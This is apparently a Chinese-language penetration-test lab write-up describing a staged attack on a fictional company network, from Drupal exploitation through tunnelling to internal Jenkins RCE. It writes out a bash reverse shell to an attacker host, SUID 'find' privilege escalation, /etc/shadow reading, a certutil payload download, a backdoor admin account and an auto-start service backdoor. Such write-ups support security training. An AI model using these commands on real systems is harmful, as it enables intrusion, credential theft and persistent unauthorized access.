## 项目场景说明

A 集团是一家在科技行业中占据重要地位的公司，拥有庞大的外部资产和复杂的内部网络。为了应对日益严峻的网络安全威胁以及遵守国家的网络安全保护要求，集团决定开展一次全面的安全评估。

经过严格筛选，A 集团决定聘请某安全团队。你作为团队领队，需要合理地分配任务，让团队成员协作完成本次安全评估工作。

------

### 场景一：边界网络渗透测试

#### 1. 端口扫描与服务发现

目标机器 IP：`172.16.12.20`

- 主机发现
- 端口与服务探测
   主要为 `80` 端口（Web 服务）

#### 2. 漏洞分析

- Web 服务漏洞发现
- 在 MSF 上搜索 Drupal 相关漏洞：
   `searchsploit drupal`

#### 3. 获取 Shell

- 设置参数
- 执行漏洞利用
- 成功 getshell

#### 4. 上传 WebShell（蚁剑）

1. 制作哥斯拉 WebShell
2. 上传至 Web 根目录
3. 使用蚁剑连接测试

#### 5. Bash 反弹 Shell

1. Kali 监听

2. 一句话反弹：

   ```bash
   bash -c 'exec 5<>/dev/tcp/172.16.12.23/1032; cat <&5 | while read line; do $line 2>&5 >&5; done'
   ```

3. 使用 C2（wget + nohup）

#### 6. 数据库信息查看

1. 找到数据库密码：`/var/www/sites/default/settings.php`

2. 登录数据库：

   ```bash
   mysql -u dbuser -p
   # 密码：R0ck3t
   ```

3. 基础查询：

   ```sql
   show databases;
   use drupaldb;
   show tables;
   select name, pass from user;
   ```

#### 7. 提权

- 查找 SUID：

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

- Find 提权：

  ```bash
  find ./ acce -exec '/bin/sh' \;
  ```

#### 8. 获取 root hash

```bash
cat /etc/shadow
```

示例：

```
root:$6$9N.2og0p$wcx31FyKb9mGjhn45UUJHPL...
```

------

### 场景二：代理隧道和端口转发配置

#### 1. 查看网络环境

- 网卡：`ip addr show`
- ARP：`ip neigh`
- 路由：`ip route`

#### 2. 搭建 Socks5 代理

直接使用 **gost**。

#### 3. 端口转发（接收反弹）

将 Kali 的 4444 转发到边界机 5555：

```bash
ssh -R 5555:localhost:4444 kali@172.16.12.23
```

#### 4. 生成反弹 Shell

使用 MSF 生成 x86 ELF 反弹 shell。

#### 5. 转发内网 3389 至 Kali 的 1081

```bash
ssh -R 1081:localhost:3389 kali@172.16.12.23
```

------

### 场景三：内网渗透测试

#### 1. 内网主机发现

扫描内网网段，发现：

- `172.16.13.10`

#### 2. 内网端口扫描与服务发现

示例 fscan 输出（节选）：

```
172.16.13.10:8080 open
172.16.13.10:9200 open
172.16.13.10:3306 open
...
```

漏洞识别结果包含：

- Jenkins 未授权访问
- ElasticSearch 未授权
- MS17-010

#### 3. 内网主机 getshell 流程

1. Burp 配置 Socks5

2. 访问 Jenkins：`http://172.16.13.10:8484`

3. Groovy RCE：

   ```groovy
   println "whoami".execute().text
   ```

4. 入口机监听

5. Groovy 反弹 shell

6. Getshell

7. 上传文件示例：

   ```bash
   certutil -urlcache -split -f http://172.16.13.20/pppp.exe 2.exe
   ```

#### 4. 上传文件到 C:\（MSF）

1. 上传 getsystem 工具
2. 以 system 权限写入文件
3. 文件创建成功

#### 5. 上传并执行反弹 Shell（MSF）

- 通过 C2 成功上线

#### 6. 新建用户 hd2025 并加入管理员组

```bash
net user hd2025 admin!@#45 /add
net localgroup Administrators hd2025 /add
```

验证：

```bash
net user
net localgroup Administrators
```

随后即可使用 RDP 登录。

#### 7. 服务自启动后门（持久化）

创建服务：

```bash
sc create JenkinsBack binPath= "C:\Users\hd2025\Desktop\fff.exe" start= auto DisplayName= "Jenkinsfuck"
sc start JenkinsBack
```

重启后自动上线，权限为 administrator。

------

### 团队成员及任务分配

##### 赵天亿（渗透测试专家）

- 任务：总体协调管理
- 职责：外围信息收集、文档管理、队伍协调

##### 吴圳宇（渗透测试专家）

- 任务：外部资产调查与渗透
- 职责：对公网 Linux 入口机器进行 Web 漏洞利用并突破边界

##### 宁国荣（渗透测试专家）

- 任务：内网提权与主机发现
- 职责：对入口机提权并收集内网信息

##### 王汉英（渗透测试专家）

- 任务：内网隧道搭建与端口转发
- 职责：代理内网流量至公网

##### 马家骏（红队攻防研究员）

- 任务：内网横向提权与持久化
- 职责：横向利用内网漏洞获取 Windows 主机，进行提权与创建后门

------

### 实验总结

#### 1. 外网入口与初始控制

- 信息收集
- Drupal 漏洞利用 → getshell
- 上传 Webshell（哥斯拉 + VShell）
- 提取数据库配置
- 查找 SUID → root 提权
- 获取 root hash

#### 2. 隧道搭建与内网渗透入口构建

- 部署 Socks5 + 端口转发
- 内网扫描
- Jenkins 未授权 → RCE
- 反弹 shell 成功上线

#### 3. 横向与持久化

- 上传工具、提权、写入文件
- 添加管理员用户并开启 RDP
- 设置自启服务 → 重启后自动上线

------

